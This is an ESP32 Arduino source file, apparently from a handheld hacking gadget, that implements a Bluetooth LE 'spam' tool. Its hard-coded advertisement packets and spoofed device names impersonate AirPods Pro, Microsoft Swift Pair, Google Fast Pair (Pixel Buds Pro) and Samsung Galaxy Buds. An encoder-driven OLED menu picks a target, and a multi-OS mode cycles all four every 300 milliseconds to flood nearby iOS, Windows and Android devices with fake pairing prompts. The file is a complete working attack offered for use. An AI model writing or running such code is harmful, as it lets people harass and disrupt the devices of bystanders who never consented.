#include "Infrastructure/Bluetooth/ble_spam.h"
#include "Infrastructure/Input/encoder_input.h"
#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEServer.h>
#include <esp_gap_ble_api.h>
#include <U8g2lib.h>
#include <WiFi.h>

extern U8G2_SSD1306_128X64_NONAME_F_HW_I2C u8g2;
extern bool runningApp;

// 1. AirPods Pro (Apple Proximity Pairing - 0x004C)
static const uint8_t apple_packet[] = {
    0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xaa, 0x30,
    0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
    0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12
};

// 2. Windows Swift Pair (Microsoft 0x0006)
static const uint8_t windows_packet[] = {
    0x1e, 0xff, 0x06, 0x00, 0x03, 0x00, 0x80, 0x01, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

// 3. Google Fast Pair (Android - Service Data UUID 0xFE2C, Pixel Buds Pro Model ID 0xCD8256)
static const uint8_t android_fastpair_packet[] = {
    0x02, 0x01, 0x06,
    0x03, 0x03, 0x2C, 0xFE,
    0x06, 0x16, 0x2C, 0xFE, 0xCD, 0x82, 0x56,
    0x02, 0x0A, 0xEE
};

// 4. Samsung Galaxy Buds / Watch (Samsung Electronics 0x0075)
static const uint8_t samsung_packet[] = {
    0x1B, 0xFF, 0x75, 0x00, 0x42, 0x09, 0x81, 0x02, 0x14, 0x15, 0x03, 0x21,
    0x01, 0x09, 0xEF, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00
};

static const char *kTargetLabels[5] = {
    "APPLE iOS (AirPods)",
    "WINDOWS 10/11 (Swift)",
    "ANDROID (Fast Pair)",
    "SAMSUNG (Galaxy Buds)",
    "MULTI-OS (Ciclo Auto)"
};

static bool bleInitialized = false;
static int spamMode = 0;      // 0: Selección, 1..5: Activo
static int targetChoice = 0;  // 0..4
static BLEAdvertising *pAdvertising = nullptr;
static unsigned long s_lastCycleMs = 0;
static int s_cycleSubMode = 1;

static void applyBlePayload(int mode) {
    if (WiFi.getMode() != WIFI_OFF) {
        WiFi.mode(WIFI_OFF);
    }
    const char *devName = "AirPods Pro";
    if (mode == 2) devName = "Microsoft Mouse";
    else if (mode == 3) devName = "Pixel Buds Pro";
    else if (mode == 4) devName = "Galaxy Buds2 Pro";

    if (!BLEDevice::getInitialized()) {
        BLEDevice::init(devName);
    } else {
        esp_ble_gap_set_device_name(devName);
    }

    pAdvertising = BLEDevice::getAdvertising();
    pAdvertising->stop();

    const uint8_t *pkt = apple_packet;
    size_t pktLen = sizeof(apple_packet);
    if (mode == 2) {
        pkt = windows_packet;
        pktLen = sizeof(windows_packet);
    } else if (mode == 3) {
        pkt = android_fastpair_packet;
        pktLen = sizeof(android_fastpair_packet);
    } else if (mode == 4) {
        pkt = samsung_packet;
        pktLen = sizeof(samsung_packet);
    }

    BLEAdvertisementData oAdvertisementData;
#if defined(ESP_ARDUINO_VERSION_MAJOR) && ESP_ARDUINO_VERSION_MAJOR >= 3
    oAdvertisementData.addData((char *)pkt, pktLen);
#else
    oAdvertisementData.addData(std::string((char *)pkt, pktLen));
#endif

    pAdvertising->setAdvertisementData(oAdvertisementData);
    pAdvertising->start();
}

void bleSpamLoop() {
    // 1. MENU DE SELECCIÓN CON ENCODER HW-040
    if (spamMode == 0) {
        int step = encStep();
        if (step != 0) {
            targetChoice = (targetChoice + step) % 5;
            if (targetChoice < 0) targetChoice += 5;
        }

        u8g2.clearBuffer();
        u8g2.setFont(u8g2_font_6x10_tr);
        u8g2.drawStr(8, 10, "BLE SPAM / FAST PAIR");
        u8g2.drawHLine(0, 12, 128);

        int startItem = targetChoice - 1;
        if (startItem < 0) startItem = 0;
        if (startItem > 5 - 3) startItem = 5 - 3;

        u8g2.setFont(u8g2_font_5x7_tr);
        for (int i = 0; i < 3; i++) {
            int idx = startItem + i;
            int y = 24 + (i * 11);
            if (idx == targetChoice) {
                u8g2.drawRBox(3, y - 7, 122, 10, 2);
                u8g2.setDrawColor(0);
                u8g2.drawStr(8, y, kTargetLabels[idx]);
                u8g2.setDrawColor(1);
            } else {
                u8g2.drawStr(8, y, kTargetLabels[idx]);
            }
        }

        u8g2.drawHLine(0, 53, 128);
        u8g2.drawStr(6, 62, "OK: Iniciar | HOLD: Salir");
        u8g2.sendBuffer();

        if (encOk()) {
            spamMode = targetChoice + 1;
            bleInitialized = false;
            s_cycleSubMode = 1;
            encClear();
        }
        if (encBack()) {
            if (pAdvertising) pAdvertising->stop();
            runningApp = false;
            encClear();
        }
        return;
    }

    // 2. INICIALIZACIÓN O CICLO MULTI-OS
    if (!bleInitialized) {
        int effectiveMode = (spamMode == 5) ? s_cycleSubMode : spamMode;
        applyBlePayload(effectiveMode);
        s_lastCycleMs = millis();
        bleInitialized = true;
    } else if (spamMode == 5 && (millis() - s_lastCycleMs > 300)) {
        s_cycleSubMode = (s_cycleSubMode % 4) + 1;
        applyBlePayload(s_cycleSubMode);
        s_lastCycleMs = millis();
    }

    // 3. INTERFAZ ACTIVA
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_6x10_tr);
    u8g2.drawStr(4, 11, "BLE SPAM ACTIVO");
    u8g2.drawHLine(0, 14, 128);

    u8g2.setFont(u8g2_font_5x7_tr);
    u8g2.setCursor(5, 28);
    u8g2.print("Modo: ");
    u8g2.print(kTargetLabels[spamMode - 1]);

    u8g2.setCursor(5, 42);
    u8g2.print("Estado: TRANSMITIENDO");

    static uint8_t anim = 0;
    u8g2.drawDisc(112, 38, 2);
    u8g2.drawCircle(112, 38, 4 + ((anim++ / 3) % 3) * 3);

    u8g2.drawStr(5, 60, "[OK/HOLD] Volver al Menu");
    u8g2.sendBuffer();

    // 4. VOLVER AL SUBMENÚ DE SELECCIÓN DE OBJETIVO
    if (encOk() || encBack()) {
        if (pAdvertising) pAdvertising->stop();
        spamMode = 0;
        bleInitialized = false;
        encClear();
    }
}
